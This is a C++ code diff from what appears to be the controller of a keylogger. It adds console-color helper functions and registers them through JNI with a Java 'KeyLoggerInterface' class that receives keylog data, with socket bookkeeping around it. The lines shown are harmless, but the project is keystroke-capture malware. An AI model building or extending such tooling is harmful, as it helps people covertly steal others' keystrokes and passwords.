@@ -14,6 +14,32 @@ SOCKETLIST *head;
 JavaVM* jvm;
 JNIEnv* env;
 int ConnectionCount;
+JNICALL void setConsoleColorDefault()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x0f);
+}
+JNICALL void setConsoleColorCaptureInformationCB()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x30);
+}
+JNICALL void setConsoleColorProcessInformation()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x2f);
+}
+JNICALL void setConsoleColorTitleInformation()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x4f);
+}
+JNICALL void setConsoleColorCaptureInformationKL()
+{
+    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);
+    SetConsoleTextAttribute(hCon,0x60);
+}
+
 
  JNICALL jobjectArray getBuffer()
   {
@@ -208,6 +234,7 @@ void Handler()
 */
 int main()
 {
+
     ConnectionCount=0;
 
     mu = CreateMutex(NULL,false,NULL);
@@ -238,13 +265,21 @@ int main()
     jint k = JNI_CreateJavaVM(&jvm,reinterpret_cast<void**>(&env),&args);
     if (k != JNI_OK)
     {
+
         return -1;
     }
+
     jclass cls = env->FindClass("keyloggerinterface/KeyLoggerInterface");
-    JNINativeMethod methods[] = {"getBuffer", "()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;", (void*)&getBuffer};
+    JNINativeMethod methods[] = {"getBuffer", "()[Lkeyloggerinterface/KeyLoggerInterface$keylogdata;", (void*)&getBuffer,
+                                "setConsoleColorDefault", "()V",(void*)&setConsoleColorDefault,
+                                "setConsoleColorCaptureInformationCB", "()V",(void*)&setConsoleColorCaptureInformationCB,
+                                "setConsoleColorProcessInformation", "()V",(void*)&setConsoleColorProcessInformation,
+                                "setConsoleColorTitleInformation", "()V",(void*)&setConsoleColorTitleInformation,
+                                "setConsoleColorCaptureInformationKL", "()V",(void*)&setConsoleColorCaptureInformationKL};
+
     jmethodID Init = env->GetMethodID(cls,"<init>","()V");
     jobject obj = env->NewObject(cls,Init);
-    env->RegisterNatives(cls,methods,1);
+    env->RegisterNatives(cls,methods,6);
     jmethodID Init_Gui = env->GetMethodID(cls,"Console","()V");
     env->CallVoidMethod(obj,Init_Gui);
     delete option;
